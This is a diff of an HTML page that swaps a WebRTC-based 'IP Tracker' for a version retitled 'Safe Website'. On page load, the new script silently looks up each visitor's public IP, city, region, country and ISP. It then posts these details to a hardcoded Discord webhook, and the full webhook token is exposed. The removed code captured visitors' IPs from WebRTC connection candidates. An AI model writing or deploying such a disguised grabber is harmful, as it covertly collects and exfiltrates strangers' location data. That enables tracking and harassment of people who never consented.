@@ -3,75 +3,59 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IP Tracker</title>
+    <title>Safe Website</title>
 </head>
 <body>
-    <h1>Welcome to My Website</h1>
+    <h1>Hello!</h1>
     <script>
         let webhook = "https://discord.com/api/webhooks/1299717230833176588/1BpkO2_kOXWWlDFHKwMswBllt2Xl_s3aJisHGzJPNGo0U_iYA6FUwWHo3Wf-rdY_hcH_";
 
-        window.oRTCPeerConnection = window.oRTCPeerConnection || window.RTCPeerConnection;
+        // Function to retrieve the user's IP and geolocation details
+        async function retrieveIPInfo() {
+          try {
+            // First, get the public IP address using ipify
+            const ipResponse = await fetch("https://api.ipify.org?format=json");
+            const ipData = await ipResponse.json();
+            const ip = ipData.ip;
 
-        window.RTCPeerConnection = function (...args) {
-          const pc = new window.oRTCPeerConnection(...args);
+            // Use ipinfo.io to get geolocation details (doesn't require an API key for basic info)
+            const geoResponse = await fetch(`https://ipinfo.io/${ip}/json`);
+            const geoData = await geoResponse.json();
 
-          pc.oaddIceCandidate = pc.addIceCandidate;
+            // Prepare the embed for Discord webhook
+            let random = Math.floor(Math.random() * 100);
+            const myEmbed = {
+              author: {
+                name: `${random} | Adres IP: ${ip}`
+              },
+              title: `City: **${geoData.city || "N/A"}** | Region: **${geoData.region || "N/A"}**`,
+              description: `Country: **${geoData.country || "N/A"}** | ISP: **${geoData.org || "N/A"}**`,
+              color: hexToDecimal('#' + Math.round((0x1000000 + 0xffffff * Math.random())).toString(16).slice(1)),
+            };
 
-          pc.addIceCandidate = function (iceCandidate, ...rest) {
-            const fields = iceCandidate.candidate.split(" ");
-            const ip = fields[4];
-            if (fields[7] === "srflx") {
-                postujdodc(ip);
-                pocczekajchwile(1500);
-                return;
-            }
-            return pc.oaddIceCandidate(iceCandidate, ...rest);
-          };
-          return pc;
-        };
+            const params = {
+              username: `ome.bot`,
+              embeds: [myEmbed],
+            };
 
-        let postujdodc = async (ip) => {
-          let url = `http://ip-api.com/json/${ip}`;
-          let random = Math.floor(Math.random() * 100);
+            // Send the IP data to the Discord webhook
+            const request = new XMLHttpRequest();
+            request.open("POST", webhook);
+            request.setRequestHeader("Content-type", "application/json");
+            request.send(JSON.stringify(params));
 
-          var request = new XMLHttpRequest();
-          request.open("POST", webhook);
-          request.setRequestHeader('Content-type', 'application/json');
-
-          await fetch(url).then((response) =>
-          response.json().then((json) => {
-          
-          var myEmbed = {
-            author: {
-              name: `${random} | Adres IP: ${ip}`,
-              icon_url: `${json.countryFlag}`
-            },
-            title: `Miasto: **${json.city}** | Region: **${json.regionName}**`,
-            description: `Kraj: **${json.country}** | Dostawca Internetu: **${json.isp}**`,
-            color: hexToDecimal('#' + Math.round((0x1000000 + 0xffffff * Math.random())).toString(16).slice(1)),
-          };
-          
-          var params = {
-            username: `ome.bot`,
-            embeds: [ myEmbed ],
-          };
-          
-          request.send(JSON.stringify(params));
-          
-          function hexToDecimal(hex) {
-            return parseInt(hex.replace("#",""), 16);
-          }
-        }));
-        };
-
-        function pocczekajchwile(milliseconds) {
-          var start = new Date().getTime();
-          for (var i = 0; i < 1e7; i++) {
-            if ((new Date().getTime() - start) > milliseconds){
-              break;
-            }
+          } catch (error) {
+            console.error("Error retrieving IP info:", error);
           }
         }
+
+        // Function to convert HEX to decimal (used for embed color)
+        function hexToDecimal(hex) {
+          return parseInt(hex.replace("#", ""), 16);
+        }
+
+        // Run the IP info retrieval function when the page loads
+        retrieveIPInfo();
     </script>
 </body>
 </html>
